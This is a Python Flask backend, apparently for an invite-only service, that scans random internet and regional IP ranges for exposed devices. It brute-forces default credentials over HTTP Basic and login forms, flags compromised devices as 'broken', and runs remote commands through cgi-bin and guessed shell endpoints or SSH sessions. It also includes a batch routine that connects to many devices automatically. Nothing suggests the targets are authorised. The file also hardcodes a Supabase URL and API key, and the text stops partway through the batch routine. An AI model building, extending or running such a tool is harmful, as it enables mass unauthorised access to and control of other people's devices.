import os, json, uuid, queue, threading, time
from datetime import datetime, timezone
from functools import wraps
from flask import Flask, render_template, request, jsonify, Response, stream_with_context
from dotenv import load_dotenv

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
load_dotenv(os.path.join(BASE_DIR, '.env'))
app = Flask(__name__, static_folder=os.path.join(BASE_DIR, 'frontend', 'dist'), static_url_path='')

SUPABASE_URL = os.environ.get("SUPABASE_URL", "https://fhlrvzhwjuepftwwnmtm.supabase.co")
SUPABASE_ANON_KEY = os.environ.get("SUPABASE_ANON_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZobHJ2emh3anVlcGZ0d3dubXRtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIwNzIwNTcsImV4cCI6MjA5NzY0ODA1N30.8J9W654hvfn3oFHdv4M0yyeQeyWUOWuTEM6Dw6Ri5-M")
SUPABASE_SERVICE_ROLE_KEY = os.environ.get("SUPABASE_SERVICE_ROLE_KEY", "")

use_service_role = bool(SUPABASE_SERVICE_ROLE_KEY)
supabase_key = SUPABASE_SERVICE_ROLE_KEY if use_service_role else SUPABASE_ANON_KEY

supabase = None
if SUPABASE_URL and supabase_key:
    from supabase import create_client
    try:
        supabase = create_client(SUPABASE_URL, supabase_key)
    except Exception as e:
        print(f"[!] Supabase init error: {e}")

INVITE_ONLY = os.environ.get("INVITE_ONLY", "true").lower() == "true"

# ── Exploitation / SSH session management ──
try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False

exploit_sessions = {}
exploit_lock = threading.Lock()

scan_jobs = {}
scan_jobs_lock = threading.RLock()
SCAN_JOB_TTL_SECONDS = 6 * 60 * 60

def get_exploit_session(sid):
    with exploit_lock:
        return exploit_sessions.get(sid)

def del_exploit_session(sid):
    with exploit_lock:
        if sid in exploit_sessions:
            sess = exploit_sessions.pop(sid)
            try:
                sess["ssh"].close()
            except:
                pass

def get_supabase():
    return supabase

def verify_token(token):
    if not supabase:
        return None
    try:
        resp = supabase.auth.get_user(token)
        return resp.user
    except:
        return None

def ensure_user(uid, email):
    """Create public.users row if missing (backup for trigger)."""
    if not supabase:
        return
    try:
        existing = supabase.table("users").select("id").eq("id", uid).limit(1).execute()
        if not existing.data:
            username = email.split("@")[0] if email else uid[:8]
            supabase.table("users").insert({
                "id": uid, "email": email, "username": username,
            }).execute()
    except:
        pass

def get_user_by_token():
    auth_h = request.headers.get("Authorization", "")
    if not auth_h.startswith("Bearer "):
        return None
    return verify_token(auth_h[7:])

def require_auth(f):
    @wraps(f)
    def wrapper(*a, **kw):
        user = get_user_by_token()
        if not user:
            return jsonify({"error": "unauthorized"}), 401
        return f(user=user, *a, **kw)
    return wrapper

def scan_job_log(job, message, type_="info"):
    with job["lock"]:
        job["logs"].append({
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "message": message,
            "type": type_,
        })

def scan_job_snapshot(job):
    with job["lock"]:
        results = list(job.get("results", []))
        return {
            "id": job["id"],
            "status": job["status"],
            "created_at": job["created_at"],
            "started_at": job.get("started_at"),
            "completed_at": job.get("completed_at"),
            "total": job.get("total", 0),
            "scanned": job.get("scanned", 0),
            "results_count": len(results),
            "creds_count": sum(1 for r in results if r.get("auth_found")),
            "open_count": sum(1 for r in results if r.get("no_auth")),
            "region": job.get("region"),
            "ports": job.get("ports"),
            "max_ips": job.get("max_ips"),
            "threads": job.get("threads"),
            "country": job.get("country"),
            "geo": job.get("geo"),
            "result_id": job.get("result_id"),
            "error": job.get("error"),
            "results": results,
            "logs": list(job.get("logs", [])),
        }

def cleanup_scan_jobs():
    cutoff = time.time() - SCAN_JOB_TTL_SECONDS
    with scan_jobs_lock:
        for job_id, job in list(scan_jobs.items()):
            finished_ts = job.get("finished_ts")
            if finished_ts and finished_ts < cutoff:
                scan_jobs.pop(job_id, None)

def get_scan_job_for_user(job_id, user_id):
    with scan_jobs_lock:
        job = scan_jobs.get(job_id)
    if not job or job.get("user_id") != user_id:
        return None
    return job

def save_scan_results(user_id, total_scanned, results, region, ports):
    if not results:
        return None
    creds_count = sum(1 for r in results if r.get("auth_found"))
    open_count = sum(1 for r in results if r.get("no_auth"))
    scan_resp = supabase.table("scan_results").insert({
        "user_id": user_id,
        "total_scanned": total_scanned,
        "results_count": len(results),
        "creds_count": creds_count,
        "open_count": open_count,
        "region": region or "internet",
        "ports": ports,
        "created_at": datetime.now(timezone.utc).isoformat(),
    }).execute()
    result_id = scan_resp.data[0]["id"]
    items = []
    for i, r in enumerate(results):
        items.append({
            "result_id": str(result_id),
            "item_index": i,
            "ip": r.get("ip"), "port": r.get("port"),
            "url": r.get("url"), "device": r.get("device"),
            "no_auth": r.get("no_auth"), "auth_found": r.get("auth_found"),
            "username": r.get("username"), "password": r.get("password"),
            "note": r.get("note"), "status_code": r.get("status_code"),
            "country": r.get("country"), "country_code": r.get("country_code"),
            "region_name": r.get("region"), "city": r.get("city"),
            "lat": r.get("lat"), "lon": r.get("lon"),
            "org": r.get("org"), "isp": r.get("isp"),
            "as_info": r.get("as"),
            "broken": False,
        })
    supabase.table("scan_result_items").insert(items).execute()
    return str(result_id)

def run_scan_job(job_id):
    with scan_jobs_lock:
        job = scan_jobs.get(job_id)
    if not job:
        return

    try:
        from GetYourDevice import (
            generate_region_ips, generate_internet_ips, generate_ips,
            scan_single, SCAN_PORTS, ALL_PORTS, GeoEnricher, REGION_CONFIG
        )
        from concurrent.futures import ThreadPoolExecutor, as_completed

        target = job.get("target", "")
        region = job.get("region", "")
        max_ips = int(job.get("max_ips", 500))
        threads = int(job.get("threads", 10))
        ports = job.get("ports", "fast")
        country = job.get("country")
        do_geo = bool(job.get("geo"))

        selected_ports = ALL_PORTS if ports == "all" else SCAN_PORTS
        include_countries = None
        if country:
            include_countries = set(c.strip().upper() for c in country.split(",") if c.strip())

        if region and region in REGION_CONFIG:
            ips = generate_region_ips(region, max_ips, include_countries=include_countries)
        elif target:
            ips = generate_ips(target, max_ips)
        else:
            ips = generate_internet_ips(max_ips)

        with job["lock"]:
            job["status"] = "running"
            job["started_at"] = datetime.now(timezone.utc).isoformat()
            job["total"] = len(ips)
        scan_job_log(job, f"Starting scan - {len(ips)} targets", "info")

        pool = ThreadPoolExecutor(max_workers=min(threads, 50))
        futures = {}
        cancelled = False
        try:
            futures = {pool.submit(scan_single, ip, False, selected_ports): ip for ip in ips}
            for fut in as_completed(futures):
                if job["cancel"].is_set():
                    cancelled = True
                    break
                ip = futures[fut]
                try:
                    res = fut.result()
                except Exception:
                    res = None
                with job["lock"]:
                    job["scanned"] += 1
                    if res:
                        job["results"].extend(res)
                        for r in res:
                            if r.get("auth_found"):
                                scan_job_log(job, f"Found: {r.get('url')} - {r.get('username')}:{r.get('password')} [{r.get('device')}]", "hit")
                            elif r.get("no_auth"):
                                scan_job_log(job, f"Open: {r.get('url')} [{r.get('device')}]", "hit-open")
        finally:
            pool.shutdown(wait=not cancelled, cancel_futures=cancelled)

        if job["cancel"].is_set():
            with job["lock"]:
                job["status"] = "stopped"
            scan_job_log(job, "Scan stopped.", "info")
        else:
            if do_geo:
                with job["lock"]:
                    results_for_geo = list(job["results"])
                if results_for_geo:
                    scan_job_log(job, "Adding geolocation data...", "info")
                    geo_ips = list(set(r["ip"] for r in results_for_geo))
                    geo_data = GeoEnricher.enrich_batch(geo_ips)
                    with job["lock"]:
                        for r in job["results"]:
                            r.update(geo_data.get(r["ip"], {}))
            with job["lock"]:
                job["status"] = "complete"
            scan_job_log(job, "Scan complete.", "info")

        with job["lock"]:
            final_results = list(job["results"])
            final_status = job["status"]
            total = job.get("total", 0)
        try:
            result_id = save_scan_results(job["user_id"], total, final_results, region, ports)
            if result_id:
                with job["lock"]:
                    job["result_id"] = result_id
                scan_job_log(job, "Results saved.", "info")
        except Exception as e:
            print(f"[!] Job scan DB save error: {e}")
            scan_job_log(job, f"Save error: {e}", "err")

        with job["lock"]:
            job["status"] = final_status
            job["completed_at"] = datetime.now(timezone.utc).isoformat()
            job["finished_ts"] = time.time()
    except Exception as e:
        with job["lock"]:
            job["status"] = "error"
            job["error"] = str(e)
            job["completed_at"] = datetime.now(timezone.utc).isoformat()
            job["finished_ts"] = time.time()
        scan_job_log(job, f"Scan error: {e}", "err")

# ─────────────── Auth routes ───────────────
# Frontend sends email+password, backend handles Supabase Auth


@app.route("/api/auth/login", methods=["POST"])
def api_login():
    body = request.get_json(force=True)
    email = body.get("email", "").strip().lower()
    password = body.get("password", "")
    if not email or not password:
        return jsonify({"error": "email and password required"}), 400

    try:
        signin = supabase.auth.sign_in_with_password({"email": email, "password": password})
    except Exception as e:
        print(f"[auth] login error: {e}")
        return jsonify({"error": f"login failed: {e}"}), 401

    if not signin.session:
        return jsonify({"error": "login failed: no session"}), 401

    access_token = signin.session.access_token
    uid = signin.user.id if signin.user else ""
    username = email.split("@")[0]
    ensure_user(uid, email)
    try:
        if supabase:
            resp = supabase.table("users").select("*").eq("id", uid).limit(1).execute()
            if resp.data:
                username = resp.data[0].get("username", username)
    except:
        pass
    return jsonify({"status": "ok", "token": access_token, "user": {"email": email, "username": username, "uid": uid}})

@app.route("/api/auth/register", methods=["POST"])
def api_register():
    body = request.get_json(force=True)
    email = body.get("email", "").strip().lower()
    password = body.get("password", "")
    invite = body.get("invite_code", "").strip()
    username = body.get("username", email.split("@")[0])

    if not email or not password:
        return jsonify({"error": "email and password required"}), 400
    if len(password) < 6:
        return jsonify({"error": "password must be 6+ characters"}), 400

    if INVITE_ONLY:
        if not invite:
            return jsonify({"error": "invitation code required"}), 400
        if supabase:
            try:
                inv = supabase.table("invite_codes").select("*").eq("code", invite).eq("status", "active").limit(1).execute()
                if not inv.data:
                    return jsonify({"error": "invalid or used invitation code"}), 400
            except Exception as e:
                return jsonify({"error": f"invite check failed: {e}"}), 500

    if not supabase:
        return jsonify({"error": "registration failed: no database connection"}), 500

    try:
        signup = supabase.auth.sign_up({"email": email, "password": password})
    except Exception as e:
        print(f"[auth] sign_up error: {e}")
        return jsonify({"error": f"registration failed: {e}"}), 500

    uid = signup.user.id if signup.user else ""
    if not uid:
        return jsonify({"error": "registration failed: no uid returned"}), 500

    try:
        supabase.table("users").upsert({
            "id": uid, "email": email, "username": username,
            "avatar_url": "", "bio": "", "created_at": datetime.now(timezone.utc).isoformat(),
        }).execute()
    except Exception as e:
        print(f"[db] upsert user warning: {e}")

    if INVITE_ONLY and invite:
        try:
            inv = supabase.table("invite_codes").select("*").eq("code", invite).eq("status", "active").limit(1).execute()
            if inv.data:
                inv_id = inv.data[0]["id"]
                supabase.table("invite_codes").update({
                    "status": "used", "used_by": uid, "used_at": datetime.now(timezone.utc).isoformat()
                }).eq("id", inv_id).execute()
        except Exception as e:
            print(f"[db] invite update warning: {e}")

    # Get JWT — sign_up may return session if auto-confirmed, otherwise sign in manually
    access_token = signup.session.access_token if signup.session else ""
    if not access_token:
        try:
            signin = supabase.auth.sign_in_with_password({"email": email, "password": password})
            access_token = signin.session.access_token if signin.session else ""
        except Exception as e:
            print(f"[auth] sign_in after register error: {e}")

    return jsonify({"status": "ok", "token": access_token, "user": {"email": email, "username": username, "uid": uid}})

@app.route("/api/auth/me", methods=["GET"])
@require_auth
def api_me(user):
    return jsonify({"user": {"email": user.email, "uid": user.id, "username": user.email.split("@")[0]}})

@app.route("/api/auth/logout", methods=["POST"])
def api_logout():
    return jsonify({"status": "ok"})

@app.route("/api/auth/check-invite", methods=["GET"])
def api_check_invite():
    code = request.args.get("code", "")
    if not code:
        return jsonify({"valid": False}), 400
    if not INVITE_ONLY:
        return jsonify({"valid": True})
    try:
        inv = supabase.table("invite_codes").select("*").eq("code", code).eq("status", "active").limit(1).execute()
        return jsonify({"valid": len(inv.data) > 0})
    except:
        return jsonify({"valid": False})

# ─────────────── Scan results ───────────────

@app.route("/api/results", methods=["GET"])
@require_auth
def api_list_results(user):
    try:
        resp = supabase.table("scan_results").select("*").eq("user_id", user.id).order("created_at", desc=True).limit(100).execute()
        out = []
        for r in resp.data:
            r["id"] = str(r["id"])
            out.append(r)
        return jsonify(out)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/results/<result_id>", methods=["GET"])
@require_auth
def api_get_result(user, result_id):
    try:
        resp = supabase.table("scan_results").select("*").eq("id", result_id).eq("user_id", user.id).limit(1).execute()
        if not resp.data:
            return jsonify({"error": "not found"}), 404
        data = resp.data[0]
        data["id"] = str(data["id"])
        return jsonify(data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/results/<result_id>", methods=["DELETE"])
@require_auth
def api_delete_result(user, result_id):
    try:
        supabase.table("scan_result_items").delete().eq("result_id", result_id).execute()
        supabase.table("scan_results").delete().eq("id", result_id).eq("user_id", user.id).execute()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/results/<result_id>/items", methods=["GET"])
@require_auth
def api_result_items(user, result_id):
    try:
        resp = supabase.table("scan_result_items").select("*").eq("result_id", result_id).order("item_index").execute()
        out = []
        for r in resp.data:
            r["id"] = int(r.get("item_index", 0))
            out.append(r)
        return jsonify(out)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/results/<result_id>/items/broken", methods=["GET"])
@require_auth
def api_broken_items(user, result_id):
    try:
        resp = supabase.table("scan_result_items").select("*").eq("result_id", result_id).eq("broken", True).execute()
        out = []
        for r in resp.data:
            r["id"] = int(r.get("item_index", 0))
            out.append(r)
        return jsonify(out)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ─────────────── Device interaction ───────────────

@app.route("/api/devices/<item_id>/test", methods=["POST"])
@require_auth
def api_test_device(user, item_id):
    import requests as http_req
    from GetYourDevice import (
        extract_title, extract_form_fields, response_has_session_cookie,
        has_dashboard_content, has_login_form, count_failure_phrases,
        body_has_password_input, has_error_banner, body_has_success_phrases
    )
    from difflib import SequenceMatcher
    try:
        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
        if not resp.data:
            return jsonify({"error": "not found"}), 404
        item = resp.data[0]
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    ip = item.get("ip", "")
    port = item.get("port", 80)
    username = item.get("username", "admin")
    password = item.get("password", "admin")
    scheme = "https" if port in (443, 8443, 9443) else "http"
    item_uuid = item["id"]

    result = {"status": "error", "message": ""}
    try:
        # First get unauth body for comparison
        unauth_body = ""
        unauth_title = ""
        unauth_forms = None
        try:
            u = http_req.get(f"{scheme}://{ip}:{port}", timeout=5, allow_redirects=False, verify=False)
            unauth_body = u.text or ""
            unauth_title = extract_title(unauth_body)
            unauth_forms = extract_form_fields(unauth_body)
        except:
            pass

        r = http_req.get(f"{scheme}://{ip}:{port}", auth=(username, password),
                         timeout=10, allow_redirects=False, verify=False)
        result["status_code"] = r.status_code
        result["headers"] = dict(r.headers)
        result["body_preview"] = r.text[:2000]

        if r.status_code == 401:
            result["message"] = "HTTP 401 Unauthorized"
        elif r.status_code in (302, 301):
            dest = r.headers.get("Location", "").lower()
            login_paths = ("login", "auth", "signin", "logon", "authenticate")
            if any(x in dest for x in login_paths):
                result["message"] = f"Redirected to {dest} (login page)"
            else:
                result["status"] = "ok"
                result["message"] = f"Redirect to {dest} — credentials accepted"
                supabase.table("scan_result_items").update({"broken": True, "broken_at": datetime.now(timezone.utc).isoformat()}).eq("id", item_uuid).execute()
        elif r.status_code == 200:
            body = r.text or ""
            body_lower = body.lower()[:5000]

            # Scoring system
            score = 0
            reasons = []

            # Session cookie
            if response_has_session_cookie(r):
                score += 40
                reasons.append("session_cookie")

            # Dashboard content
            dc = has_dashboard_content(body_lower)
            if dc:
                score += 25
                reasons.append("dashboard_content")

            # Title change
            cur_title = extract_title(body)
            if cur_title and unauth_title:
                t1, t2 = cur_title.lower(), unauth_title.lower()
                if t1 != t2 and not any(x in t1 for x in ("login", "sign in", "signin", "authenticate", "password")):
                    score += 20
                    reasons.append("title_changed")

            # Form structure
            auth_forms = extract_form_fields(body)
            if unauth_forms and auth_forms:
                if unauth_forms["password_count"] > 0 and auth_forms["password_count"] == 0:
                    score += 30
                    reasons.append("no_more_password_field")

            # Success phrases
            sp = body_has_success_phrases(body)
            score += sp * 6
            if sp > 0:
                reasons.append("success_phrases")

            # Password field still present
            if body_has_password_input(body):
                score -= 40
                reasons.append("still_has_password")

            # Body similarity
            if unauth_body and len(body) > 200 and len(unauth_body) > 200:
                ratio = SequenceMatcher(None, body[:3000], unauth_body[:3000]).ratio()
                if ratio > 0.93:
                    score -= 50
                    reasons.append(f"body_similarity_{ratio:.2f}")
                elif ratio > 0.80:
                    score -= 20

            # Login form without dashboard
            if has_login_form(body_lower) and not dc:
                score -= 30
                reasons.append("login_form_no_dash")

            # Failure phrases
            fc = count_failure_phrases(body)
            score -= fc * 8
            if fc > 0:
                reasons.append(f"failure_phrases_{fc}")

            # Error banners
            if has_error_banner(body_lower):
                score -= 20
                reasons.append("error_banner")

            result["score"] = score
            result["reasons"] = reasons

            if score >= 25:
                result["status"] = "ok"
                result["message"] = f"Auth works (score={score})"
                supabase.table("scan_result_items").update({"broken": True, "broken_at": datetime.now(timezone.utc).isoformat()}).eq("id", item_uuid).execute()
            elif score >= 0:
                result["message"] = f"Uncertain (score={score}): {', '.join(reasons)}"
            else:
                result["message"] = f"Auth rejected (score={score}): {', '.join(reasons)}"
        else:
            result["message"] = f"HTTP {r.status_code}"
    except Exception as e:
        result["message"] = str(e)[:200]
    return jsonify(result)


@app.route("/api/devices/<item_id>/brute", methods=["POST"])
@require_auth
def api_brute_device(user, item_id):
    import requests as http_req
    from GetYourDevice import (
        get_relevant_creds, extract_title, extract_form_fields,
        response_has_session_cookie, has_dashboard_content, has_login_form,
        count_failure_phrases, body_has_password_input, has_error_banner,
        body_has_success_phrases, extract_login_form, try_form_auth,
    )
    from difflib import SequenceMatcher
    try:
        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
        if not resp.data:
            return jsonify({"error": "not found"}), 404
        item = resp.data[0]
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    ip = item.get("ip", "")
    port = item.get("port", 80)
    device = item.get("device", "")
    scheme = "https" if port in (443, 8443, 9443) else "http"
    base_url = f"{scheme}://{ip}:{port}"

    body_data = request.get_json(force=True) or {}
    custom_creds = body_data.get("creds", [])
    max_tries = int(body_data.get("max_tries", 50))

    # Use a session to persist cookies across requests
    ses = http_req.Session()

    # Get unauth baseline WITH redirects to capture actual login page
    unauth_body = ""
    unauth_title = ""
    unauth_forms = None
    login_form = None
    try:
        u = ses.get(base_url, timeout=8, allow_redirects=True, verify=False)
        unauth_body = u.text or ""
        unauth_title = extract_title(unauth_body)
        unauth_forms = extract_form_fields(unauth_body)
        login_form = extract_login_form(unauth_body)
    except:
        pass

    if custom_creds:
        creds_to_try = custom_creds[:max_tries]
    else:
        creds_to_try = [(u, p, n) for u, p, n in get_relevant_creds(device, max_creds=max_tries)]

    def check_auth_success(user, pw, note, r):
        if r is None: return None
        if r.status_code == 401: return None
        if r.status_code in (302, 301):
            dest = r.headers.get("Location", "").lower()
            if not any(x in dest for x in ("login", "auth", "signin", "logon")):
                return {"username": user, "password": pw, "note": note, "status": r.status_code, "score": 100}
            return None
        if r.status_code == 200:
            body = r.text or ""
            body_lower = body.lower()[:5000]
            score = 0
            if response_has_session_cookie(r): score += 40
            if has_dashboard_content(body_lower): score += 25
            cur_title = extract_title(body)
            if cur_title and unauth_title:
                t1, t2 = cur_title.lower(), unauth_title.lower()
                if t1 != t2 and not any(x in t1 for x in ("login", "sign in", "signin", "authenticate", "password")):
                    score += 20
            auth_forms = extract_form_fields(body)
            if unauth_forms and auth_forms:
                if unauth_forms["password_count"] > 0 and auth_forms["password_count"] == 0:
                    score += 30
            score += body_has_success_phrases(body) * 6
            if body_has_password_input(body): score -= 40
            if unauth_body and len(body) > 200 and len(unauth_body) > 200:
                ratio = SequenceMatcher(None, body[:3000], unauth_body[:3000]).ratio()
                if ratio > 0.93: score -= 50
                elif ratio > 0.80: score -= 20
            if has_login_form(body_lower): score -= 30
            score -= count_failure_phrases(body) * 8
            if has_error_banner(body_lower): score -= 20
            if score >= 25:
                return {"username": user, "password": pw, "note": note, "status": r.status_code, "score": score}
        return None

    working = []

    # Phase 1: HTTP Basic Auth
    for u, p, n in creds_to_try:
        if len(working) >= 5: break
        try:
            r = ses.get(base_url, auth=(u, p), timeout=5, allow_redirects=True, verify=False)
            result = check_auth_success(u, p, n, r)
            if result: working.append(result)
        except:
            pass

    # Phase 2: Form-based login (with session cookies from unauth GET)
    if login_form and len(working) == 0:
        for u, p, n in creds_to_try:
            if len(working) >= 5: break
            try:
                r = try_form_auth(ip, port, scheme, u, p, login_form, base_url, session=ses)
                result = check_auth_success(u, p, n, r)
                if result: working.append(result)
            except:
                pass

    return jsonify({"status": "ok", "total_tried": len(creds_to_try), "working": working})

@app.route("/api/devices/<item_id>/access", methods=["POST"])
@require_auth
def api_access_device(user, item_id):
    import requests as http_req
    try:
        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
        if not resp.data or not resp.data[0].get("broken"):
            return jsonify({"error": "device not found or not broken yet"}), 404
        item = resp.data[0]
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    body = request.get_json(force=True) or {}
    action = body.get("action", "info")
    ip = item["ip"]
    port = item["port"]
    u = item.get("username", "admin")
    p = item.get("password", "admin")
    scheme = "https" if port in (443, 8443, 9443) else "http"

    result = {"status": "error", "message": ""}
    try:
        if action == "info":
            r = http_req.get(f"{scheme}://{ip}:{port}", auth=(u, p), timeout=10, verify=False)
            result = {"status": "ok", "status_code": r.status_code, "headers": dict(r.headers), "body": r.text[:5000]}
        elif action == "exec":
            cmd = body.get("command", "id")
            r = http_req.get(f"{scheme}://{ip}:{port}/cgi-bin/exec?cmd={cmd}", auth=(u, p), timeout=10, verify=False)
            result = {"status": "ok", "output": r.text[:5000]}
        elif action == "config":
            r = http_req.get(f"{scheme}://{ip}:{port}/config", auth=(u, p), timeout=10, verify=False)
            result = {"status": "ok", "config": r.text[:5000]}
        elif action == "shell":
            cmd = body.get("command", "id")
            from seclist_loader import get_exploit_endpoints
            for ep in get_exploit_endpoints(item.get("device", "")):
                try:
                    r = http_req.get(f"{scheme}://{ip}:{port}{ep}?cmd={cmd}", auth=(u, p), timeout=5, verify=False)
                    if r.status_code == 200:
                        result = {"status": "ok", "endpoint": ep, "output": r.text[:5000]}
                        break
                except:
                    continue
            if result.get("status") != "ok":
                result = {"status": "ok", "message": "No shell endpoint found, creds work", "suggested_url": f"{scheme}://{ip}:{port}"}
        else:
            result = {"error": f"unknown action: {action}"}
    except Exception as e:
        result["message"] = str(e)[:200]
    return jsonify(result)


# ─────────────── Device Exploitation ───────────────

@app.route("/api/exploit/classify", methods=["POST"])
@require_auth
def api_classify_device(user):
    body = request.get_json(force=True) or {}
    device_name = body.get("device", "")
    from GetYourDevice import classify_device_type
    ctype = classify_device_type(device_name)
    return jsonify({"classification": ctype, "is_device": ctype == "device"})


@app.route("/api/exploit/devices", methods=["GET"])
@require_auth
def api_exploit_devices(user):
    from GetYourDevice import HARDWARE_DEVICE_NAMES
    try:
        resp = supabase.table("scan_result_items").select("*").eq("auth_found", True).order("id", desc=True).limit(500).execute()
        devices = []
        seen = set()
        for it in resp.data:
            ip = it.get("ip")
            if ip in seen:
                continue
            seen.add(ip)
            dn = (it.get("device") or "").lower()
            is_hw = any(kw in dn for kw in HARDWARE_DEVICE_NAMES[:80])
            if not is_hw:
                continue
            devices.append({
                "id": it["id"],
                "ip": it["ip"],
                "port": it["port"],
                "url": it.get("url"),
                "device": it.get("device"),
                "username": it.get("username"),
                "password": it.get("password"),
                "country_code": it.get("country_code"),
                "org": it.get("org"),
                "broken": it.get("broken", False),
            })
        return jsonify({"devices": devices, "total": len(devices)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/connect", methods=["POST"])
@require_auth
def api_exploit_connect(user):
    body = request.get_json(force=True) or {}
    item_id = body.get("item_id")
    if not item_id:
        return jsonify({"error": "item_id required"}), 400
    try:
        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
        if not resp.data:
            return jsonify({"error": "device not found"}), 404
        item = resp.data[0]
        if not item.get("auth_found"):
            return jsonify({"error": "no credentials available"}), 400
        ip = item["ip"]
        port = item["port"]
        u = item.get("username", "admin")
        p = item.get("password", "admin")

        # Try SSH first
        ssh_port = 22
        ssh_ok = False
        if HAS_PARAMIKO:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=ssh_port, username=u, password=p, timeout=8, banner_timeout=8)
                sid = uuid.uuid4().hex[:12]
                with exploit_lock:
                    exploit_sessions[sid] = {
                        "id": sid, "item_id": item_id, "ip": ip,
                        "username": u, "password": p,
                        "ssh": client, "protocol": "ssh",
                        "created": time.time(),
                        "user_id": user.id,
                    }
                return jsonify({"status": "ok", "protocol": "ssh", "session_id": sid})
            except Exception as e:
                pass  # SSH failed, try HTTP shell

        # Fallback: HTTP shell session
        sid = uuid.uuid4().hex[:12]
        import requests as http_req
        scheme = "https" if port in (443, 8443, 9443) else "http"
        session = http_req.Session()
        session.auth = (u, p)
        with exploit_lock:
            exploit_sessions[sid] = {
                "id": sid, "item_id": item_id, "ip": ip,
                "username": u, "password": p,
                "session": session, "protocol": "http",
                "scheme": scheme, "port": port,
                "created": time.time(),
                "user_id": user.id,
            }
        msg = "SSH unavailable, using HTTP shell" if not HAS_PARAMIKO else "SSH failed, using HTTP shell"
        return jsonify({"status": "ok", "protocol": "http", "session_id": sid, "note": msg})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/session/<sid>/command", methods=["POST"])
@require_auth
def api_exploit_command(user, sid):
    sess = get_exploit_session(sid)
    if not sess:
        return jsonify({"error": "session not found or expired"}), 404
    if sess.get("user_id") != user.id:
        return jsonify({"error": "not your session"}), 403
    body = request.get_json(force=True) or {}
    cmd = body.get("command", "id")
    if not cmd:
        return jsonify({"error": "command required"}), 400
    try:
        if sess.get("protocol") == "ssh":
            _, stdout, stderr = sess["ssh"].exec_command(cmd, timeout=10)
            out = stdout.read().decode(errors="replace")[:10000]
            err = stderr.read().decode(errors="replace")[:5000]
            return jsonify({"status": "ok", "output": out, "stderr": err})
        else:
            import requests as http_req
            scheme = sess["scheme"]
            ip = sess["ip"]
            port = sess["port"]
            target = f"{scheme}://{ip}:{port}"
            from seclist_loader import get_exploit_endpoints
            for ep in get_exploit_endpoints(sess.get("device", "")):
                try:
                    r = sess["session"].get(f"{target}{ep}?cmd={cmd}", timeout=5, verify=False)
                    if r.status_code == 200:
                        return jsonify({"status": "ok", "output": r.text[:10000], "endpoint": ep})
                except:
                    continue
            return jsonify({"status": "ok", "output": "", "note": "No HTTP shell endpoint found"})
    except Exception as e:
        return jsonify({"error": str(e)[:300]}), 500


@app.route("/api/exploit/session/<sid>/disconnect", methods=["POST"])
@require_auth
def api_exploit_disconnect(user, sid):
    sess = get_exploit_session(sid)
    if not sess:
        return jsonify({"error": "session not found"}), 404
    if sess.get("user_id") != user.id:
        return jsonify({"error": "not your session"}), 403
    try:
        if sess.get("protocol") == "ssh":
            sess["ssh"].close()
    except:
        pass
    del_exploit_session(sid)
    return jsonify({"status": "ok", "message": "disconnected"})


@app.route("/api/exploit/sessions", methods=["GET"])
@require_auth
def api_exploit_sessions(user):
    with exploit_lock:
        sessions = []
        for sid, s in exploit_sessions.items():
            if s.get("user_id") == user.id:
                sessions.append({
                    "id": sid, "ip": s["ip"], "protocol": s.get("protocol", "http"),
                    "username": s.get("username"), "created": s.get("created"),
                    "item_id": s.get("item_id"),
                })
        return jsonify({"sessions": sessions, "count": len(sessions)})


@app.route("/api/exploit/batch", methods=["POST"])
@require_auth
def api_exploit_batch(user):
    """Try connecting to all hardware devices with creds automatically."""
    from GetYourDevice import HARDWARE_DEVICE_NAMES
    try:
        resp = supabase.table("scan_result_items").select("*").eq("auth_found", True).order("id", desc=True).limit(200).execute()
        results = []
        for it in resp.data:
            dn = (it.get("device") or "").lower()
            if not any(kw in dn for kw in HARDWARE_DEVICE_NAMES[:80]):
                continue
            ip = it["ip"]
            u = it.get("username", "admin")
            p = it.get("password", "admin")
            ssh_ok = False
            if HAS_PARAMIKO:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port=22, username=u, password=p, timeout=6, banner_timeout=6)
                    sid = uuid.uuid4().hex[:12]
                    with exploit_lock:
                        exploit_sessions[sid] = {
                            "id": sid, "item_id": it["id"], "ip": ip,
                            "username": u, "password": p,
                            "ssh": client, "protocol": "ssh",
                            "created": time.time(), "user_id": user.id,
                        }
                    results.append({"ip": ip, "status": "connected", "protocol": "ssh", "session_id": sid})
                    ssh_ok = True
                except:
                    pass
            if not ssh_ok:
                import requests as http_req
                scheme = "https" if it["port"] in (443, 8443, 9443) else "http"
                try:
                    r = http_req.get(f"{scheme}://{ip}:{it['port']}", auth=(u, p), timeout=5, verify=False)
                    if r.status_code == 200:
                        sid = uuid.uuid4().hex[:12]
                        session = http_req.Session()
                        session.auth = (u, p)
                        with exploit_lock:
                            exploit_sessions[sid] = {
                                "id": sid, "item_id": it["id"], "ip": ip,
                                "username": u, "password": p,
                                "session": session, "protocol": "http",
                                "scheme": scheme, "port": it["port"],
                                "created": time.time(), "user_id": user.id,
                            }
                        results.append({"ip": ip, "status": "web_reachable", "session_id": sid})
                    else:
                        results.append({"ip": ip, "status": f"http_{r.status_code}"})
                except Exception as e:
